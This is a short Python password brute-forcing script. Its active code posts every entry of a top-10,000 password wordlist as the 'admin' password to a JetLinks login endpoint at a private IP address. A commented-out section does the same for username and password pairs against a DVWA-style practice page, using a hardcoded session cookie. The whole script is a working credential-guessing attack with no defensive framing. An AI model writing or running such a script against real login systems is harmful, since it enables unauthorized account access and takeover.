import requests
import re

headers = {
    "Cookie": "security=low; PHPSESSID=dspqpd9s5b32u1tc5c4j5ind4c"
}
ip = "101.34.143.5:8888"  # localhost
# url = "http://101.34.143.5:8888/vulnerabilities/brute/?username=admin&password=password&Login=Login"
url = "http://192.168.19.185:9000/jetlinks/authorize/login"
# res = requests.get(url,headers=headers)

with open('./somd5-top1w.txt','r') as f:
    lines =f.readlines()
    for line in lines:
        password = line.strip('\n')
        json = {"username": "admin", "password": password, "expires": 3600000,
                "tokenType": "default", "verifyKey": "",
                "verifyCode": ""}
        res = requests.post(url, json=json)
        print(res.json())

# fileusernames = open("names.txt","r")
# usernames = fileusernames.readlines()
# filepasswords = open("dict.txt","r")
# passwords = filepasswords.readlines()
#
# for username in usernames:
#     for password in passwords:
#         response = requests.get(url+"?username="+username[:-1]+"&password="+password[:-1]+"&Login=Login", headers=headers) # low & medium #
#         if not re.findall("Username and/or password incorrect", response.text):
#             print(username[:-1]+":"+password[:-1])
